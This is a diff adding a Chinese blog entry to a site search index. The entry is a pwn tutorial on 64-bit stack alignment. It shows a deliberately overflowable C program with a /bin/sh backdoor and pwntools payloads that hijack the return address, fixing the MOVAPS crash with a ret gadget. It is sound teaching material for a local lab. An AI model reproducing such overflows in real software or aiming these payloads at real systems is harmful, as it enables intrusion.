@@ -429,4 +429,64 @@
         <tag>php-wrappers</tag>
       </tags>
   </entry>
+  <entry>
+    <title>栈平衡详解</title>
+    <url>/2022/10/07/stack_balance/</url>
+    <content><![CDATA[<p>绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。</p>
+<span id="more"></span>
+
+<h1><span id="概念">概念</span></h1><blockquote>
+<p>函数如果要返回父程序，则在堆栈中进行操作的时候，一定要在RET指令之前，将ESP指向函数入栈前的地址。</p>
+<p>每调用一个CALL，就会开辟一个新的栈空间，如果没有栈平衡功能的实现，那么很容易会破坏其它栈里的数据，导致程序崩溃。</p>
+<p>在Ubuntu18以上环境的64位程序，当调用<code>printf</code>或是<code>system</code>时，需要保证RSP &amp; 0xf == 0，即16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。</p>
+</blockquote>
+<h1><span id="示例">示例</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以一个简单的栈溢出程序为例，在<code>Ubuntu 18.04</code>系统上进行64位编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; gcc exp.c -o exp -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure>
+
+<p>为了方便演示关闭了PIE保护和canary。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; checksec --file=exp     </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64 Symbols	  No	0		1		exp</span><br></pre></td></tr></table></figure>
+
+<p>搓个人畜无害的exp，attach上gdb进行动态调试</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400571</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20221006230718.png"></p>
+<p>可以看到溢出利用是成功的，至此一切正常。继续单步跳过</p>
+<p><img src="/images/20221006231052.png"></p>
+<p>步入<code>system</code>调用后，整个程序就寄在了MOVAPS指令<sup>[1]</sup>，同时抛出错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault。</span><br></pre></td></tr></table></figure>
+
+<p>因为MOVAPS指令要求目标操作数是内存操作数时对齐16字节边界，如果没对齐会就会出现分段错误。</p>
+<blockquote>
+<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated. </p>
+</blockquote>
+<p>回头看现在栈上的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp   0x7fff001f9818 -&gt; 0x7fff001f9b30 &lt;- 0x0</span><br></pre></td></tr></table></figure>
+
+<p>此时RSP寄存器的值是0x7fff001f9818，并没有对齐16字节，即强行跳转后门函数破坏了栈平衡，需要完善栈溢出的操作。</p>
+<p>一种常见的解决方法是在调用后门函数之前塞个RET指令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x40054b</span>) + p64(<span class="number">0x400571</span>)</span><br></pre></td></tr></table></figure>
+
+<p>RET指令可以看作等效于POP EIP（实际上没有这个指令<sup>[2]</sup>），也即先弹出栈顶的数据（RSP+8），之后再压栈，将RSP的值对齐16字节完成栈平衡。否则会因为此处意★义★不★明的PUSH造成函数入栈后RSP的值-8。</p>
+<p><img src="/images/20221007230240.png"></p>
+<p>可以看到RSP的值在PUSH后变回了为0x7ffd49459a20。</p>
+<p><img src="/images/20221007232057.png"></p>
+<p>单步跟进到MOVAPS指令，此时RSP寄存器的值为0x7ffd49459680，对齐16字节。</p>
+<p><img src="/images/20221007233355.png"></p>
+<p>本地成功打通。</p>
+<p><img src="/images/20221007233711.png"></p>
+<p>而难以定位RET指令的时候（如开启了PIE保护），既然此处的思想是用POP抵消掉PUSH来保证栈平衡，我们不妨做得更绝一点，要是直接舍弃意★义★不★明的PUSH呢？</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400572</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20221007234640.png"></p>
+<p>可以看到仍然保证了栈平衡。本地成功打通。</p>
+<p><img src="/images/20221007235102.png"></p>
+<h1><span id="外部链接">外部链接</span></h1><p>[1] <a href="https://www.felixcloutier.com/x86/movaps">Move Aligned Packed Single-Precision Floating-Point Values</a></p>
+<p>[2] <a href="https://stackoverflow.com/questions/56676840/is-pop-eip-legal-instruction">Is pop eip legal instruction?</a></p>
+]]></content>
+      <tags>
+        <tag>pwn-stackbalance</tag>
+      </tags>
+  </entry>
 </search>
